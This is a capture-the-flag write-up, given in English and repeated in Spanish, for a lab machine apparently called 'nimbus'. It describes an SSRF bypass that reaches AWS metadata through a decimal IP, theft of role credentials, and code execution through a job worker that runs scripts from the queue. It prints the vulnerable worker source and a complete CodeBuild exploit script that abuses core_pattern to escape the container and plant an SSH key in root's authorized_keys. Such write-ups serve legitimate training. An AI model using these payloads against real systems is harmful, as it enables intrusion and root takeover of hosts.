Exploitation Summary

Exploitation process: The target exposed a web application allowing users to submit jobs by URL. The hint about internal addresses and IMDS-style cloud metadata endpoints being blocked immediately pointed to an SSRF vulnerability. By converting the IMDS IP 169.254.169.254 to its decimal form (2852039166) and appending a ?.yaml query parameter, I bypassed the filter and reached the AWS metadata service.

From the IMDS I extracted temporary credentials for the nimbus-web-role. Using these credentials with a LocalStack-like AWS endpoint, enumeration revealed an SQS queue nimbus-jobs. Further SSRF-based internal port scanning exposed an S3 endpoint holding the worker source code (worker.py), which executed any script field of a submitted job directly with python3.

Sending a crafted message to the SQS queue gave me a reverse shell as the worker user inside a container. From there, internal network mapping revealed a LocalStack instance at 172.18.0.2:4566 accessible as the AWS root account using the default test:test credentials.

Finally, I abused AWS CodeBuild on LocalStack: creating a privileged build (privilegedMode: True grants CAP_SYS_ADMIN), overriding the mkdir command via BASH_FUNC environment injection, and abusing core_pattern to execute a root payload on the host. This wrote my SSH public key into /root/.ssh/authorized_keys, granting root via SSH.

Technologies/Exploits: SSRF decimal IP bypass against AWS IMDS, SSRF internal enumeration, AWS SQS worker RCE via YAML/Python job execution, LocalStack CodeBuild core_pattern abuse for container escape and privilege escalation.

Analyzing the Worker

"""Nimbus job worker"""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/847219365028/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5

print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    print(f"[worker] received message ({len(body)} bytes)", flush=True)
    job = yaml.load(body, Loader=yaml.Loader)
    if not isinstance(job, dict):
        print("[worker] message did not parse to a dict, skipping", flush=True)
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    print(f"[worker] running job '{name}'", flush=True)
    if script:
        result = subprocess.run(["python3", "-c", script],
                                capture_output=True, text=True, timeout=30)
        print(f"[worker] stdout: {result.stdout}", flush=True)
        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)

def main():
    while True:
        try:
            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
                                       MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
            for m in resp.get("Messages", []):
                try: handle_message(m["Body"])
                except Exception as e: print(f"[worker] error: {e}", flush=True)
                finally:
                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
        except Exception as e:
            print(f"[worker] poll error: {e}", flush=True)
        time.sleep(POLL_SECS)

if __name__ == "__main__":
    main()

Here it's especially interesting that the worker can receive a script field and execute it directly with python.

Achieving Root via core_pattern Abuse

To reach the host later I need elevated root privileges, so to solve this I'll override environment variables via BASH_FUNC_mkdir%% in the next build. This will make it so that when the container is built and uses the mkdir command with elevated privileges, I'll replace the mkdir command with the command(s) I define, thus achieving RCE as root in the container:

import boto3

ENDPOINT = 'http://172.18.0.2:4566'
PROJECT = 'nimbus-deploy'

cb = boto3.client('codebuild',
    region_name='us-east-1',
    endpoint_url=ENDPOINT,
    aws_access_key_id='test',
    aws_secret_access_key='test',
)

buildspec = r"""version: 0.2
phases:
  build:
    commands:
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
      - printf '#!/bin/sh\necho ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnsFLLgBuhGAkDdmNK86OBVaDN8Aqyy+l6EpQuz8uBJ asd@asd.com > /root/.ssh/authorized_keys\n' > /exploit_root.sh || true
      - chmod +x /exploit_root.sh || true
      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
      - ulimit -c unlimited || true
      - bash -c 'kill -11 $$' || true
"""

try:
    cb.create_project(
        name=PROJECT,
        source={'type': 'NO_SOURCE'},
        artifacts={'type': 'NO_ARTIFACTS'},
        environment={
            'type': 'LINUX_CONTAINER',
            'computeType': 'BUILD_GENERAL1_SMALL',
            'image': 'floci/floci:latest',
            'privilegedMode': True,
            'environmentVariables': [],
        },
        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
    )
    print("Project created")
except Exception as e:
    print("Already exists:", e)

resp = cb.start_build(
    projectName=PROJECT,
    environmentVariablesOverride=[
        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
    ],
    buildspecOverride=buildspec,
)
print("Build:", resp['build']['id'])

In this final build, what I do is create the nimbus-deploy project if it doesn't exist, and then create a build that runs the following commands:

  1. With the mountinfo command I get the path on the host where the container's changes are written — the path in the system where the new container I generate lives.
  2. I create a payload that is a shell script inside the container that writes my public key to /root/.ssh/authorized_keys on the host.
  3. I write the path where the script I created lives into /proc/sys/kernel/core_pattern. This tells the kernel what to do when a process crashes (having the CAP_SYS_ADMIN privilege lets me write to this file). So when a process crashes it will run my script on the host, as root!
  4. I enable core dumps for the current process.
  5. I trigger the crash (SIGSEGV), which sets off the chain I built with my payload.

When all of this happens, the end result is that my public key is written to /root/.ssh/authorized_keys on the host, and now I can log in via SSH as root and get the system flag:

root@nimbus:~# whoami
root

Resumen de Explotación

Resumen del proceso: El objetivo exponía una aplicación web que permitía enviar jobs por URL. La pista sobre direcciones internas y endpoints de metadatos cloud tipo IMDS bloqueados apuntaba directamente a una vulnerabilidad SSRF. Convirtiendo la IP de IMDS 169.254.169.254 a su forma decimal (2852039166) y añadiendo el query parameter ?.yaml, bypasseé el filtro y alcancé el servicio de metadatos de AWS.

Desde el IMDS extraje credenciales temporales del rol nimbus-web-role. Usando estas credenciales contra un endpoint AWS tipo LocalStack, la enumeración reveló una cola SQS nimbus-jobs. Un barrido de puertos internos vía SSRF expuso un endpoint S3 que alojaba el código fuente del worker (worker.py), que ejecutaba directamente con python3 cualquier campo script de un job enviado.

Enviando un mensaje diseñado a la cola SQS conseguí una reverse shell como usuario worker dentro de un contenedor. Desde ahí, el mapeo de la red interna reveló una instancia de LocalStack en 172.18.0.2:4566 accesible como cuenta root de AWS usando las credenciales por defecto test:test.

Finalmente, abusé de AWS CodeBuild sobre LocalStack: creando una build privilegiada (privilegedMode: True otorga CAP_SYS_ADMIN), sobrescribiendo el comando mkdir mediante inyección de variables de entorno BASH_FUNC, y abusando de core_pattern para ejecutar un payload como root en el host. Esto escribió mi clave pública SSH en /root/.ssh/authorized_keys, otorgando acceso root vía SSH.

Tecnologías/Exploits: bypass SSRF con IP decimal contra AWS IMDS, enumeración interna vía SSRF, RCE mediante el worker de AWS SQS por ejecución de jobs YAML/Python, abuso de core_pattern en LocalStack CodeBuild para escape de contenedor y escalada de privilegios.

Analizando el Worker

"""Nimbus job worker"""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/847219365028/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5

print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    print(f"[worker] received message ({len(body)} bytes)", flush=True)
    job = yaml.load(body, Loader=yaml.Loader)
    if not isinstance(job, dict):
        print("[worker] message did not parse to a dict, skipping", flush=True)
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    print(f"[worker] running job '{name}'", flush=True)
    if script:
        result = subprocess.run(["python3", "-c", script],
                                capture_output=True, text=True, timeout=30)
        print(f"[worker] stdout: {result.stdout}", flush=True)
        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)

def main():
    while True:
        try:
            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
                                       MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
            for m in resp.get("Messages", []):
                try: handle_message(m["Body"])
                except Exception as e: print(f"[worker] error: {e}", flush=True)
                finally:
                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
        except Exception as e:
            print(f"[worker] poll error: {e}", flush=True)
        time.sleep(POLL_SECS)

if __name__ == "__main__":
    main()

Aquí es especialmente interesante que el worker puede recibir un campo script y ejecutarlo con python directamente.

Consiguiendo Root mediante Abuso de core_pattern

Para poder acceder al host más adelante necesito privilegios elevados de root, así que para solucionar esto voy a hacer un override de variables de entorno mediante BASH_FUNC_mkdir%% en la próxima build. Esto hará que al construirse el contenedor y cuando use el comando mkdir con privilegios elevados, el comando mkdir lo cambiaré por el comando o comandos que yo defina, así consiguiendo RCE como root en el contenedor: 

import boto3

ENDPOINT = 'http://172.18.0.2:4566'
PROJECT = 'nimbus-deploy'

cb = boto3.client('codebuild',
    region_name='us-east-1',
    endpoint_url=ENDPOINT,
    aws_access_key_id='test',
    aws_secret_access_key='test',
)

buildspec = r"""version: 0.2
phases:
  build:
    commands:
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
      - printf '#!/bin/sh\necho ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnsFLLgBuhGAkDdmNK86OBVaDN8Aqyy+l6EpQuz8uBJ asd@asd.com > /root/.ssh/authorized_keys\n' > /exploit_root.sh || true
      - chmod +x /exploit_root.sh || true
      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
      - ulimit -c unlimited || true
      - bash -c 'kill -11 $$' || true
"""

try:
    cb.create_project(
        name=PROJECT,
        source={'type': 'NO_SOURCE'},
        artifacts={'type': 'NO_ARTIFACTS'},
        environment={
            'type': 'LINUX_CONTAINER',
            'computeType': 'BUILD_GENERAL1_SMALL',
            'image': 'floci/floci:latest',
            'privilegedMode': True,
            'environmentVariables': [],
        },
        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
    )
    print("Proyecto creado")
except Exception as e:
    print("Ya existe:", e)

resp = cb.start_build(
    projectName=PROJECT,
    environmentVariablesOverride=[
        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
    ],
    buildspecOverride=buildspec,
)
print("Build:", resp['build']['id'])

En esta build final lo que hago es crear el proyecto nimbus-deploy si no existe y luego creo una build que ejecuta los siguientes comandos:

  1. Con el comando mountinfo consigo la ruta en el host donde se escriben los cambios del contenedor, es la ruta en el sistema donde vive el nuevo contenedor que genero.
  2. Creo un payload que es un script shell dentro del contenedor que escribe mi clave pública en la ruta /root/.ssh/authorized_keys del host.
  3. Escribo la ruta de donde vive el script que he creado en /proc/sys/kernel/core_pattern, esto le dice al kernel qué hacer cuando un proceso crashea (al tener el privilegio CAP_SYS_ADMIN puedo escribir en este archivo). Entonces cuando crashee un proceso ejecutará mi script en el host, ¡como root!
  4. Habilito los core dumps en el proceso actual.
  5. Provoco el crash (SIGSEGV), lo que desencadena la cadena que he construido con mi payload.

Cuando todo esto ocurre, el resultado final es que mi clave pública queda escrita en /root/.ssh/authorized_keys en el host, y ahora puedo entrar mediante SSH como root y consigo la flag del sistema:

root
